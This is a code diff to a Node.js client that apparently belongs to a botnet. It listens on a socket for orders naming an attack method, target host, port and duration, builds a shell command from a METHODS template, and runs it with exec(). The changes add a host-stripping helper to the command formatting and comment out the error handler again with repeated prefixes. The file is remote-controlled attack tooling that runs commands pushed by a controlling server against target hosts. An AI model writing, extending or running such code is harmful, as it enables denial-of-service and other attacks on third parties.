@@ -24,6 +24,14 @@ const ERRORS_TO_RETRY = [
     "ECONNREFUSED",
 ]
 
+const stripHost = function (host) {
+    host = host.replace(/\./g, "")
+    host = host.replace(/^https?:\/\//, "")
+    host = host.split(":")[0]
+    host = host.split("/")[0]
+    return host
+}
+
 const checkError = (error) =>
     ERRORS_TO_RETRY.some((err) => error.toString().includes(err))
 
@@ -81,7 +89,13 @@ client.on("data", function (data) {
         const host = data[1]
         const port = data[2]
         const time = data[3]
-        const cmd = util.format(METHODS[method], host, host, port, time)
+        const cmd = util.format(
+            METHODS[method],
+            stripHost(host),
+            host,
+            port,
+            time
+        )
         exec(cmd)
         console.log(
             chalk.grey(
@@ -121,19 +135,19 @@ client.on("close", function (err) {
     }
 })
 
-client.on("error", function (err) {
-    // if (checkError(err)) {
-    //     console.log(
-    //         chalk.grey(
-    //             `[${chalk.redBright(
-    //                 "-"
-    //             )}] Connection could not be established. Retrying...`
-    //         )
-    //     )
-    //     setTimeout(doConnect, 5000)
-    // } else {
-    //     console.log(
-    //         chalk.grey(`[${chalk.redBright("-")}] Connection error. ${err}`)
-    //     )
-    // }
-})
+// // // // // // // // // client.on("error", function (err) {
+// // // // // // // // //     // if (checkError(err)) {
+// // // // // // // // //     //     console.log(
+// // // // // // // // //     //         chalk.grey(
+// // // // // // // // //     //             `[${chalk.redBright(
+// // // // // // // // //     //                 "-"
+// // // // // // // // //     //             )}] Connection could not be established. Retrying...`
+// // // // // // // // //     //         )
+// // // // // // // // //     //     )
+// // // // // // // // //     //     setTimeout(doConnect, 5000)
+// // // // // // // // //     // } else {
+// // // // // // // // //     //     console.log(
+// // // // // // // // //     //         chalk.grey(`[${chalk.redBright("-")}] Connection error. ${err}`)
+// // // // // // // // //     //     )
+// // // // // // // // //     // }
+// // // // // // // // // })
